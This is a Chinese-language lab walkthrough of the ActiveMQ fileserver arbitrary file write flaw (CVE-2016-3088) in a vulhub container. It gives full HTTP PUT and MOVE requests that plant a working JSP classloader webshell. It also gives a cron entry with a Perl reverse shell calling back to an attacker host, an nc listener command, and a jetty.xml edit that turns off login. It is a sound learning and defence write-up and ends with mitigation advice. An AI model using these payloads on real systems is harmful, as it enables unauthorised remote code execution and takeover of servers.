## 引言

今天来复现一下ActiveMQ任意文件写入漏洞 (CVE-2016-3088)  
vulhub的官网有对这个漏洞的英文介绍[ActiveMQ Arbitrary File Write Vulnerability
(CVE-2016-3088)](https://vulhub.org/#/environments/activemq/CVE-2016-3088/)  
本文主要分为三个部分：

> 漏洞原理（基于vulhub）以及知识点引申
>
> 漏洞复现
>
> 漏洞引发的思考

## 漏洞介绍和知识拓展

背景简述和漏洞详情部分来源于vulhub

## 背景简述

ActiveMQ的web控制台分为三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。

fileserver是一个RESTful
API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：

> 其使用率并不高
>
> 文件操作容易出现漏洞

所以，
**ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启）；在5.14.0版本以后，彻底删除了fileserver应用。**

在测试过程中，可以 **关注ActiveMQ的版本** ，避免走弯路。

## 漏洞详情

本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。

文件写入有几种利用方法：

> 写入webshell
>
> 写入cron或ssh key等文件
>
> 写入jar或jetty.xml等库和配置文件

写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh
key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。

## 知识拓展

背景简述和漏洞详情里面有几点和漏洞强相关的知识点是我之前没有接触过的，需要学习和理解一下：

> cron是什么
>
> 反弹shell是什么
>
> cron或ssh key和反弹shell的关系
>
> jetty和jetty.xml是什么
>
> linux文件权限

下面来一个一个了解一下：

### cron是什么

在这个链接找到了cron的介绍：[Cron是什么？利用Cron Job自动执行定时任务](https://www.simcf.cc/9288.html)  
简单来说，cron是linux系统的守护进程，用于在特定时间自动执行重复任务。

### 反弹shell是什么

简单来说反弹shell（reverse shell）就是反向的shell，是相对于标准shell的一个概念。  
标准shell是攻击者作为客户端去连接目标服务器；  
而反弹shell是攻击者作为服务器，监听某端口，而目标设备作为客户端主动连接攻击者。  
反弹shell的应用场景：

> 目标机在局域网内
>
> 目标机ip地址是动态的
>
> 有防火墙等限制，目标机只能发请求，不能收请求
>
> 不确定目标机何时具备连接条件

这部分主要参考：[反弹shell原理与实现](https://zhuanlan.zhihu.com/p/138393396)  
至于具体的反弹shell百度一搜全都是，就不说了。

### cron或ssh key和反弹shell的关系

cron和反弹shell的关系很好理解，就是往目标机的定时任务文件中写反弹shell脚本；  
ssh key和反弹shell的关系，从网上查到的资料看，是往目标机里面写了攻击机的ssh
key（公钥）之后，攻击机就可以免密登录目标机。可是这不还是攻击机做客户端，目标机做服务器么？还是需要目标机开启ssh服务，并且允许攻击机连接，和反弹关系不大呀。。。小小的脑袋，大大的问号，也不知道是牵强附会，还是我没找到正确的资料。。  
这部分主要参考：  
[Linux反弹shell](https://blog.csdn.net/qq_36119192/article/details/84641379)  
[不请自来 | Redis 未授权访问漏洞深度利用](https://www.freebuf.com/vuls/148758.html)

### jetty和jetty.xml是什么

简单来说，jetty是一种开源的servlet容器，是基于java的web容器，和tomcat是一类东西。jetty是通过API或者XML文件进行配置的，而jetty.xml是jetty的一个重要配置文件。

### linux文件权限

vulhub官网教程中，据不完全统计，至少有两句话提到了权限相关的问题：

> This method requires the ActiveMQ run as root, otherwise it will not be able
> to write to the cron file.  
> 这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。  
> In some cases, the owner of jetty.xml and jar is the user of the web
> container, so the success rate of writing crontab is higher.  
> 有的情况下，jetty.xml和jar的所有人是web容器的用户，所以相比起来，写入crontab成功率更高一点。

总而言之，由于是通过ActiveMQ进行文件上传，因此运行ActiveMQ的用户必须有目标文件夹，或者需要修改的文件的写权限才行。

那么要确定能否写入或者修改文件，就需要确定两件事情：

> 文件或文件夹权限
>
> 运行ActiveMQ的用户

下面就以/etc/cron.d目录和jetty.xml文件来演示如何获取以上两点信息。（ **提前声明：
这部分内容仅仅是知识扩展，对于实际攻击没什么意义** ）

#### 文件或文件夹权限

首先需要运行docker容器activemq/CVE-2016-3088

    
    
    sudo docker-compose up -d
    

![image](https://image.3001.net/images/20210523/1621771643_60aa457bec9d19f34a7be.png!small)

然后可以通过登录网页http://your-ip:8161/确认容器运行成功  
![image](https://image.3001.net/images/20210523/1621771675_60aa459bbb087e1a2b99f.png!small)

接下来用下面的命令查看正在运行的docker容器id

    
    
    sudo docker container ps
    

![image](https://image.3001.net/images/20210523/1621771697_60aa45b1176da8c504fdf.png!small)

然后用下面这个命令进入容器

    
    
    sudo docker exec -it 容器id  /bin/bash
    

![image](https://image.3001.net/images/20210523/1621771717_60aa45c51bea343e9f46f.png!small)

然后就用cd命令定位到我们想观察的点，再ls -l看看文件夹和文件的所有者和权限设置  
从下图中可以看到/etc/cron.d目录的所有者是root，root用户的权限是可读写可执行；root组和其他组用户权限都是可读可执行。  
![image](https://image.3001.net/images/20210523/1621772338_60aa48322732af838cb4d.png!small)

而从下图中可以看到jetty.xml文件的所有者也是root，root用户的权限是可读写，其他用户的权限是可读。  
![image](https://image.3001.net/images/20210523/1621772352_60aa4840dfd9a7e5e5be2.png!small)

运行ActiveMQ的用户

我想到两种方法查看运行ActiveMQ的用户：

第一种 通过ps命令

容器里面是没有ps命令的，需要用下面的命令先安装一下

    
    
    apt-get update && apt-get install procps
    

安装好之后，用下面的命令查看运行activemq console的用户

    
    
    ps aux
    

从下图可知，运行ActiveMQ的用户是root  
![image](https://image.3001.net/images/20210523/1621772370_60aa485278021416ccd51.png!small)

第二种 通过网页

访问网页：http://your-ip:8161/admin/test/systemProperties.jsp可以看到运行ActiveMQ的用户是root：  
![image](https://image.3001.net/images/20210523/1621772385_60aa48616bfa50fdd6def.png!small)

综上所述，运行ActiveMQ的用户是root，而root对/etc/cron.d目录和jetty.xml文件都是有写权限的，因此理论上上传crontab文件，以及修改jetty.xml文件都应该是可实现的。

## 漏洞复现

### 版本要求

根据vulhub上的背景简述可知，该漏洞影响版本是ActiveMQ在5.14.0之前的版本（不包括5.14.0）。  
既然是vulhub提供的漏洞复现环境，那版本肯定是没问题的啦，不过如果想要确认一下版本的话，可以用浏览器访问http://your-ip:8161/admin/  
![image](https://image.3001.net/images/20210523/1621772502_60aa48d67e4d9e10dc20d.png!small)

### 途径1：写入webshell

前提条件

> 需要知道ActiveMQ的绝对路径
>
> 需要能登录admin或者api

思路分析

由于要满足以上两个前提条件，并且ActiveMQ的绝对路径可以通过http://your-ip:8161/admin/test/systemProperties.jsp页面获取，而这个页面也需要登录admin之后才能访问。因此，应该按照如下步骤实施攻击：

> 获取admin应用的用户名和密码
>
> 访问http://your-ip:8161/admin/test/systemProperties.jsp获取ActiveMQ的绝对路径
>
> 上传webshell
>
> 将webshell移动到admin所在文件夹
>
> 连接webshell

利用步骤

1、获取admin应用的用户名和密码  
不是重点，不详细说了，而且这个步骤放在这篇文章里完全是为了攻击链的完整性，其实vulhub的教程已经说了默认用户名和密码都是admin。  
我能想到的几种获取用户名和密码的方法：

> 尝试默认用户名和密码
>
> 尝试弱口令（暴力破解）
>
> 社工

暴力破解可以用Burp Suite的intruder模块，由于不是这篇的强相关内容，这里就不占篇幅了，之前我写过[Burp
Suite爆破Basic认证密码](https://blog.csdn.net/elephantxiang/article/details/117046198)就是基于这个漏洞环境写的，可以参考。如果要同时暴力破解用户名和密码，可以参照这篇博客，写的挺清楚[使用
Burp suite 爆破 HTTP Basic 认证](https://xiaix.me/shi-yong-burp-suite-bao-po-http-basic-ren-zheng/)

2、获取ActiveMQ的绝对路径  
得到admin应用的用户名和密码之后，就可以访问网页http://your-ip:8161/admin/test/systemProperties.jsp来获取ActiveMQ的绝对路径了，具体见下图红框框。这个网页有挺多有意思的信息的，这里不展开说了。  
![image](https://image.3001.net/images/20210523/1621772530_60aa48f2c4be317aeb627.png!small)

3、上传webshell  
先得把webshell上传到fileserver，之后才能从fileserver转移。由于ActiveMQ是个java程序，因此需要传个jsp
webshell。  
在网上找了个jsp
webshell：[蚁剑jsp一句话木马](https://blog.csdn.net/qq_43615820/article/details/116357744)  
用PUT方法把webshell上传到fileserver：

    
    
    PUT /fileserver/ele.txt HTTP/1.1
    Host: http://192.168.116.129:8161
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Length: 956
    
    <%!
    class U extends ClassLoader {
    U(ClassLoader c) {
    super(c);
    }
    public Class g(byte[] b) {
    return super.defineClass(b, 0, b.length);
    }
    }
     
    public byte[] base64Decode(String str) throws Exception {
    try {
    Class clazz = Class.forName("sun.misc.BASE64Decoder");
    return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
    } catch (Exception e) {
    Class clazz = Class.forName("java.util.Base64");
    Object decoder = clazz.getMethod("getDecoder").invoke(null);
    return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
    }
    }
    %>
    <%
    String cls = request.getParameter("passwd");
    if (cls != null) {
    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
    %>
    

Response报文状态码204表示上传成功：  
![image](https://image.3001.net/images/20210523/1621772553_60aa4909ee484f16fd904.png!small)

4、将webshell移动到admin所在文件夹  
用MOVE方法进行webshell的移动

    
    
    MOVE /fileserver/ele.txt HTTP/1.1
    Destination: file:///opt/activemq/webapps/admin/ele.jsp
    Host: http://192.168.116.129:8161
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Length: 2
    

同样，Response报文状态码204表示移动成功：  
![image](https://image.3001.net/images/20210523/1621772567_60aa4917235fb880f2c43.png!small)

5、连接webshell  
这里用蚁剑演示一下， **重点是记住admin应用是需要登录的，所以记得一定要在连接中添加Authorization头** 。  
基础配置：  
![image](https://image.3001.net/images/20210523/1621772582_60aa4926f14cebc69b89c.png!small)

请求信息：  
![image](https://image.3001.net/images/20210523/1621772595_60aa49337b0a294d0ba7a.png!small)

连接成功：  
![image](https://image.3001.net/images/20210523/1621772607_60aa493fda1fab226d8f8.png!small)

### 途径2：写入ssh key

前提条件

> 需要运行ActiveMQ的用户有root权限
>
> 需要服务器开启了ssh服务，并且攻击机可以连接

可行性判断

针对上述条件1，在知识扩展部分已经知道运行ActiveMQ的用户是root，条件1满足。  
针对上述条件2，可以通过nmap扫描来探测服务器是否开启ssh且可达。  
nmap命令：

    
    
    nmap -sV your-ip -p-    

your-ip是漏洞环境的ip地址  
扫描结果：  
![image](https://image.3001.net/images/20210523/1621773232_60aa4bb0643f77a069633.png!small)

从扫描结果可见，服务器只有8161和61616端口可达，条件2不满足，此路不通。  
（注意：其实由于漏洞环境在容器内，your-ip是搭载容器的机器的ip，因此如果这个机器上开了ssh，而不是容器开了ssh，应该会出现nmap扫描出ssh端口的情况，但实际上条件2不满足。另外，从前述容器内ps
aux的结果也可以看出，容器内并没有开启ssh服务）

### 途径3：写入cron拿反弹shell

前提条件

> 需要运行ActiveMQ的用户有root权限
>
> 服务器开启了cron服务
>
> 运行ActiveMQ的用户有使用crontab的权限

前两点在知识拓展中已经被证明满足了，而第3点在默认情况下是满足的，除非存在cron.allow或者cron.deny文件，但这两个文件在vulhub提供的漏洞环境中并不存在。因此本环境理论上可以通过写入cron拿反弹shell。

思路分析

这种方法思路就比较简单了：

> 上传cron文件到fileserver
>
> 把cron文件从fileserver转移到/etc/cron.d/ele
>
> 攻击机上开启监听并等待反弹shell连接

这个网页有反弹shell合集，可以参考：[反弹shell的方法总结](https://www.freebuf.com/articles/web/247967.html)  
 **需要注意以下三点** ：

> 首先是vulhub提示的cron配置文件中换行一定要\n，不能是\r\n，否则crontab执行会失败。这一点在下面的漏洞利用过程中没有体会到。
>
> 另外，/etc/cron.d 文件夹中的任务文件命名有特殊要求，只能使用 [\w-] 字符，不能有 . （[/etc/cron.d
> 攻略](https://blog.51cto.com/u_13886444/2317402)）
>
> vulhub提供的示例中反弹shell用的是perl
> shell，这个反弹shell能成功的前提是服务器上安装了perl，另外，是否需要知道perl的绝对路径要看运气（看服务器上是否有相关的软链接）。  
>
> 测试过程中我也尝试了cron文件中写bash反弹shell，但是反弹shell没有执行成功，目前还不知道是什么原因。网上搜索cron反弹shell的资料时，发现有人在其他环境上尝试bash反弹shell也没成功。。

利用步骤

1、上传cron文件到fileserver  
payload如下，需要修改Host头

    
    
    PUT /fileserver/ele.txt HTTP/1.1
    Host: 192.168.116.129:8161
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Length: 241
    
    */1 * * * * root perl -e 'use Socket;$i="192.168.116.1";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    

请求数据部分是cron文件格式的perl反弹shell，*/1 * * *
*表示定时任务执行时间是每分钟一次，root表示执行定时任务的用户，后面就是perl反弹shell的内容了。万一服务器上没有perl的软链接，就需要写perl的绝对路径了，比如/usr/bin/perl  
此外还要注意，反弹shell中的$i为攻击机ip，$p为攻击机监听的端口。  
Response报文状态码204表示文件上传成功  
![image](https://image.3001.net/images/20210523/1621773258_60aa4bca2ac1b29d1991e.png!small)

2、把cron文件从fileserver转移到/etc/cron.d/ele  
用MOVE命令转移文件，payload如下：

    
    
    MOVE /fileserver/ele.txt HTTP/1.1
    Destination: file:///etc/cron.d/ele
    Host: 192.168.116.129:8161
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Length: 2
    

Response报文状态码204表示文件转移成功  
![image](https://image.3001.net/images/20210523/1621773284_60aa4be41ffbf89587329.png!small)

3、攻击机上开启监听并等待反弹shell连接  
攻击机上用nc开监听，监听7777端口，命令如下：

    
    
    nc -l -p 7777
    

耐心等一会儿（1min内见分晓），就能连上服务器啦  
![image](https://image.3001.net/images/20210523/1621773303_60aa4bf7e47879f58b27c.png!small)

### 途径4：修改jetty.xml

前提条件

> 需要知道ActiveMQ的绝对路径
>
> 需要有jetty.xml的写权限

思路分析

使用这种方法，主要是用来突破admin应用和api应用的访问控制限制。  
vulhub给的思路是修改jetty.xml文件，使admin和api应用不用登录，然后写入webshell。后来查阅ActiveMQ的资料之后（[activemq安全设置—设置admin的用户名和密码](https://www.yisu.com/zixun/48695.html)，[activemq安全设置
设置admin的用户名和密码](https://blog.csdn.net/stevenprime/article/details/7091224)），觉得其实也可以修改jetty-realm.properties文件中的用户密码，不过由于jetty.xml中限制了用户名，所以修改jetty-realm.properties文件的方法还需要一个前提是知道用户名，两相比较，其实还是修改jetty.xml好多了。

使用这种方法，完整的攻击链是：

> 获得ActiveMQ的绝对路径
>
> 上传修改后的jetty.xml文件到fileserver
>
> 转移上传的jetty.xml文件到
> ActiveMQ的绝对路径/conf/jetty.xml，以覆盖原本的jetty.xml文件，目的是绕过admin和api应用的用户认证。
>
> 上传webshell到fileserver
>
> 转移webshell到admin或者api应用
>
> 连接webshell

利用步骤

 **写在前面：**  
vulhub上没有这种方法的复现，我在vulhub提供的漏洞环境中尝试了，虽然jetty.xml文件可以修改成功，但是修改并没有生效，在网页上尝试登录http://your-ip:8161/admin/还是会弹出HTTP Basic认证的框框。甚至后来删掉jetty.xml也完全不受影响。后来也尝试了stop再start
ActiveMQ，奇怪的是ActiveMQ stop之后，http://your-ip:8161也可以照常登录。所以我目前比较怀疑是漏洞环境有问题，但是不太清楚是什么问题。因此先把jetty.xml文件修改思路记下来，如果以后有必要自己搭环境复现这个漏洞或者类似的漏洞，到时候好有个参考。如果有哪位路过的大神知道具体是什么问题，或者在vulhub提供的漏洞环境上成功使admin应用不必进行用户认证，还望不吝赐教，无限感激~

下面只写修改jetty.xml相关的步骤，以及排查问题用到的相关命令：  
1、上传修改后的jetty.xml文件到fileserver  
我修改了
**securityConstraint和adminSecurityConstraint中的authenticate，value从true改为false**
。

    
    
    <bean id="securityConstraint" class="org.eclipse.jetty.util.security.Constraint">
        <property name="name" value="BASIC" />
        <property name="roles" value="user,admin" />
        <!-- set authenticate=false to disable login -->
        <property name="authenticate" value="false" />
    </bean>
    <bean id="adminSecurityConstraint" class="org.eclipse.jetty.util.security.Constraint">
        <property name="name" value="BASIC" />
        <property name="roles" value="admin" />
         <!-- set authenticate=false to disable login -->
        <property name="authenticate" value="false" />
    </bean>
    

把修改后的完整jetty.xml发送到fileserver：  
![image](https://image.3001.net/images/20210523/1621773321_60aa4c09c6f260a587a48.png!small)

2、转移上传的jetty.xml文件到 ActiveMQ的绝对路径/conf/jetty.xml  
这步假设已经通过其他方法获得ActiveMQ的绝对路径了，jetty.xml在
ActiveMQ的绝对路径/conf/目录下，通过MOVE方法将jetty.xml从fileserver转移到该目录，覆盖原来的jetty.xml：  
![image](https://image.3001.net/images/20210523/1621773338_60aa4c1a441fa9e51ac27.png!small)

原始的jetty.xml的这部分是下面这样：  
![image](https://image.3001.net/images/20210523/1621773353_60aa4c29a080c729dda8a.png!small)

通过上面两个步骤修改后这部分是这样的，可见修改是成功的：  
![image](https://image.3001.net/images/20210523/1621773367_60aa4c37a15e41102c816.png!small)

但是HTTP Basic认证的框框还是弹出来了，无奈：  
![image](https://image.3001.net/images/20210523/1621773382_60aa4c469c70c0d39f503.png!small)

后来想试试重启ActiveMQ有没有用：  
在容器内先用find / -name activemq命令找了一下ActiveMQ都在哪里  
![image](https://image.3001.net/images/20210523/1621773395_60aa4c53c7284436a80a2.png!small)

然后在上图所示的几个目录下都尝试了./activemq stop和./activemq start命令，重新启动之后，访问http://your-ip:8161/admin/还是会弹出HTTP Basic认证的框框。  
到这里我有点怀疑./activemq stop和./activemq start是不是只对61616端口有效了，所以就在./activemq
stop后，用nmap扫描了61616端口，发现端口还是开启的。。。悬案。。。  
![image](https://image.3001.net/images/20210523/1621773411_60aa4c63dad96472c907f.png!small)

## 一些思考

### 任意文件写入漏洞利用思路

通过这个漏洞学习到三种利用任意文件写入漏洞拿下网站的思路：

> 写入webshell（修改jetty.xml只是为写入webshell排除掉admin和api需要登录的前提条件）
>
> 写入cron文件（定时反弹shell）
>
> 写入ssh key

三种思路的前提条件分别如下：

 **写入webshell**

> 需要写入的目录可以执行webshell
>
> 如果写入的目录不可以执行webshell，但文件可以通过MOVE命令转移，需要目标文件夹可以执行webshell，并且知道目标文件夹的绝对路径。
>
> 如果webshell所在文件夹需要登录，还需要知道用户名和密码。

 **写入cron文件（定时反弹shell）**

> 需要运行漏洞应用的用户有root权限
>
> 服务器开启了cron服务
>
> 运行漏洞应用的用户有使用crontab的权限

 **写入ssh** **key**

> 需要运行漏洞应用的用户有root权限
>
> 需要服务器开启了ssh服务，并且攻击机可以连接

### 任意文件写入漏洞防御思路

根据本漏洞总结的几个任意文件写入漏洞防御思路：

> 遵循最小权限原则，能不用root用户运行的功能就不要用root用户运行。
>
> 慎重使用MOVE方法。
>
> 文件上传功能需要访问控制。
>
> 对上传的文件需要进行过滤防护。
>
> 上传文件的目标文件夹需要最好不要有执行代码的权限。

